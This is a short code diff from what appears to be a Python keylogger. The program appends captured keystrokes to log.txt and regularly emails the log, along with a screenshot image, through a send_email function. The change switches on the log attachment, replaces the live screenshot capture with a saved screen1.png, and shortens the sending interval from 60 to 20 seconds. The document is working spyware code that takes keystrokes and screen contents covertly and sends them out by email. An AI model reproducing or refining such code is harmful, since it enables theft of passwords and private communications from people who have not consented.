@@ -63,11 +63,11 @@ def send_email():
     p.set_payload((message).read())
     encoders.encode_base64(p)
     p.add_header('Content-Disposition', "attachment; filename= %s" % "log.txt")
-    #msg.attach(p)
+    msg.attach(p)
 
-    myScreenshot = pyautogui.screenshot()
-    myScreenshot.save(r'screen.png')
-    with open("screen.png", "rb") as f:
+    #myScreenshot = pyautogui.screenshot()
+    #myScreenshot.save(r'screen1.png')
+    with open("screen1.png", "rb") as f:
         image = MIMEImage(f.read())
         image.add_header('Content-ID', '<{0}>'.format(1))
         msg.attach(image)
@@ -108,7 +108,7 @@ def main():
             with open("log.txt", "a") as f:
                 f.write(typed)
                 typed = ""
-        if round(time.time()) - start_time > 60:
+        if round(time.time()) - start_time > 20:
             send_email()
             start_time = round(time.time())
     in_file.close()
